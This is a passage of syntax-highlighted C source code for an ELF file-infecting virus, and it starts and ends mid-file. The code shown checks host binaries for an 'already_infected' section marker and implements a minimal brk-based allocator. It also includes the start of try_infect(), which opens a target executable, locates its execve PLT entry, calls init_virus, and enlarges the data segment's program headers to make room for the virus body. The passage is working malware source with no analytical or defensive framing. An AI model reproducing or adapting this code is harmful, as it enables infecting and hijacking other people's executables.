        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">_strcmp</span><span class="sc10">(&amp;</span><span class="sc11">bin</span><span class="sc10">-&gt;</span><span class="sc11">string</span><span class="sc10">[</span><span class="sc11">shdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">sh_name</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">newsecstr</span><span class="sc10">))</span><span class="sc0">
            </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">already_infected</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">bin</span><span class="sc10">-&gt;</span><span class="sc11">bss</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc0">
                </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">sectionp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">bin</span><span class="sc10">-&gt;</span><span class="sc11">section</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_shnum</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">i</span><span class="sc10">++,</span><span class="sc0"> </span><span class="sc11">sectionp</span><span class="sc10">++</span><span class="sc0">
        </span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">shdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">sh_type</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">SHT_NOBITS</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">bin</span><span class="sc10">-&gt;</span><span class="sc11">bss</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">load_section</span><span class="sc10">(</span><span class="sc11">sectionp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">shdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">])</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">asection_error</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">bin</span><span class="sc10">-&gt;</span><span class="sc11">bss</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">asection_error</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">asection_error</span><span class="sc10">:</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(--</span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">--,</span><span class="sc11">sectionp</span><span class="sc10">--)</span><span class="sc0"> </span><span class="sc11">_free</span><span class="sc10">(*</span><span class="sc11">sectionp</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">already_infected</span><span class="sc10">:</span><span class="sc0">
</span><span class="sc11">string_error</span><span class="sc10">:</span><span class="sc0">
    </span><span class="sc11">_free</span><span class="sc10">(</span><span class="sc11">bin</span><span class="sc10">-&gt;</span><span class="sc11">string</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">section_error</span><span class="sc10">:</span><span class="sc0">
    </span><span class="sc11">_free</span><span class="sc10">(</span><span class="sc11">bin</span><span class="sc10">-&gt;</span><span class="sc11">section</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">shdr_error</span><span class="sc10">:</span><span class="sc0">
    </span><span class="sc11">_free</span><span class="sc10">(</span><span class="sc11">bin</span><span class="sc10">-&gt;</span><span class="sc11">shdr</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">phdr_error</span><span class="sc10">:</span><span class="sc0">
    </span><span class="sc11">_free</span><span class="sc10">(</span><span class="sc11">bin</span><span class="sc10">-&gt;</span><span class="sc11">phdr</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">error</span><span class="sc10">:</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">free_bin</span><span class="sc10">(</span><span class="sc11">bin_t</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">bin</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">_free</span><span class="sc10">(</span><span class="sc11">bin</span><span class="sc10">-&gt;</span><span class="sc11">phdr</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">_free</span><span class="sc10">(</span><span class="sc11">bin</span><span class="sc10">-&gt;</span><span class="sc11">shdr</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">bin</span><span class="sc10">-&gt;</span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_shnum</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
        </span><span class="sc11">_free</span><span class="sc10">(</span><span class="sc11">bin</span><span class="sc10">-&gt;</span><span class="sc11">section</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]);</span><span class="sc0">
    </span><span class="sc11">_free</span><span class="sc10">(</span><span class="sc11">bin</span><span class="sc10">-&gt;</span><span class="sc11">section</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">memzero</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">ptr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">len</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">len</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc11">ptr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">_strlen</span><span class="sc10">(</span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">str</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">p</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">p</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">str</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">p</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">++</span><span class="sc11">p</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">p</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">str</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/*
    the most dodgy malloc implementation in existance. its simple and its
    tiny however.
*/</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">malloc_init</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">p</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">getdataseg</span><span class="sc10">()[</span><span class="sc11">ORIGINAL_BRK</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">b</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">_brk</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">p</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">b</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">255</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">p</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">b</span><span class="sc0"> </span><span class="sc10">&gt;&gt;</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">255</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">p</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">b</span><span class="sc0"> </span><span class="sc10">&gt;&gt;</span><span class="sc0"> </span><span class="sc4">16</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">255</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">p</span><span class="sc10">[</span><span class="sc4">3</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">b</span><span class="sc0"> </span><span class="sc10">&gt;&gt;</span><span class="sc0"> </span><span class="sc4">24</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">_malloc</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">size</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">b</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc11">b</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">_brk</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">_brk</span><span class="sc10">(</span><span class="sc11">b</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">size</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">b</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">_free</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">ptr</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">freeall</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">p</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">getdataseg</span><span class="sc10">()[</span><span class="sc11">ORIGINAL_BRK</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">b</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">p</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">p</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">p</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc4">16</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">p</span><span class="sc10">[</span><span class="sc4">3</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc4">24</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">_brk</span><span class="sc10">(</span><span class="sc11">b</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">try_infect</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">host</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">Elf32_Phdr</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">phdr</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">Elf32_Shdr</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">shdr</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">move</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">out</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">in</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">evaddr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">text_start</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">plt</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">bss_len</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">addlen</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">addlen2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">addlen3</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">offset</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pos</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">oshoff</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">null</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">stat</span><span class="sc0"> </span><span class="sc11">st_buf</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">bin_t</span><span class="sc0"> </span><span class="sc11">bin</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">Elf32_Shdr</span><span class="sc0"> </span><span class="sc11">newshdr</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">zero</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">data</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">getdataseg</span><span class="sc10">();</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">tempname</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">data</span><span class="sc10">[</span><span class="sc11">TEMPNAME</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">DEBUG_STRING</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">data</span><span class="sc10">[</span><span class="sc11">SEC_STRING</span><span class="sc10">];</span><span class="sc0">

    </span><span class="sc11">in</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">_open</span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">O_RDONLY</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">in</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">load_bin</span><span class="sc10">(</span><span class="sc11">in</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">bin</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">DEBUG_STRING</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">plt</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">find_rel</span><span class="sc10">(</span><span class="sc0">
        </span><span class="sc11">in</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc11">bin</span><span class="sc10">.</span><span class="sc11">string</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc10">&amp;</span><span class="sc11">bin</span><span class="sc10">.</span><span class="sc11">ehdr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">bin</span><span class="sc10">.</span><span class="sc11">shdr</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc10">&amp;</span><span class="sc11">data</span><span class="sc10">[</span><span class="sc11">EXECVE</span><span class="sc10">]</span><span class="sc0">
    </span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">phdr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">bin</span><span class="sc10">.</span><span class="sc11">phdr</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">bin</span><span class="sc10">.</span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_phnum</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">phdr</span><span class="sc10">-&gt;</span><span class="sc11">p_type</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">PT_LOAD</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">phdr</span><span class="sc10">-&gt;</span><span class="sc11">p_offset</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">text_start</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">phdr</span><span class="sc10">-&gt;</span><span class="sc11">p_vaddr</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">text_start</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">bin_error</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc1">/* is this the data segment ? */</span><span class="sc0">
                </span><span class="sc11">offset</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">phdr</span><span class="sc10">-&gt;</span><span class="sc11">p_offset</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">phdr</span><span class="sc10">-&gt;</span><span class="sc11">p_filesz</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">bss_len</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">phdr</span><span class="sc10">-&gt;</span><span class="sc11">p_memsz</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">phdr</span><span class="sc10">-&gt;</span><span class="sc11">p_filesz</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">init_virus</span><span class="sc10">(</span><span class="sc0">
                    </span><span class="sc11">plt</span><span class="sc10">,</span><span class="sc0">
                    </span><span class="sc11">phdr</span><span class="sc10">-&gt;</span><span class="sc11">p_vaddr</span><span class="sc10">,</span><span class="sc0">
                    </span><span class="sc11">phdr</span><span class="sc10">-&gt;</span><span class="sc11">p_memsz</span><span class="sc10">,</span><span class="sc0">
                    </span><span class="sc11">bin</span><span class="sc10">.</span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_entry</span><span class="sc10">,</span><span class="sc0">
                    </span><span class="sc10">&amp;</span><span class="sc11">bin</span><span class="sc0">
                </span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">bin_error</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">++</span><span class="sc11">phdr</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">addlen</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">VIRUS_LENGTH</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">bss_len</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc1">/*
    update the phdr's to reflect the extention of the data segment (to
    allow virus insertion)
*/</span><span class="sc0">
    </span><span class="sc11">phdr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">bin</span><span class="sc10">.</span><span class="sc11">phdr</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">bin</span><span class="sc10">.</span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_phnum</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">phdr</span><span class="sc10">-&gt;</span><span class="sc11">p_type</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">PT_DYNAMIC</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">move</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">phdr</span><span class="sc10">-&gt;</span><span class="sc11">p_offset</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">addlen</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">phdr</span><span class="sc10">-&gt;</span><span class="sc11">p_type</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">PT_LOAD</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">phdr</span><span class="sc10">-&gt;</span><span class="sc11">p_offset</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc1">/* is this the data segment ? */</span><span class="sc0">
                </span><span class="sc11">phdr</span><span class="sc10">-&gt;</span><span class="sc11">p_filesz</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">addlen</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">phdr</span><span class="sc10">-&gt;</span><span class="sc11">p_memsz</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">addlen</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">move</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">++</span><span class="sc11">phdr</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
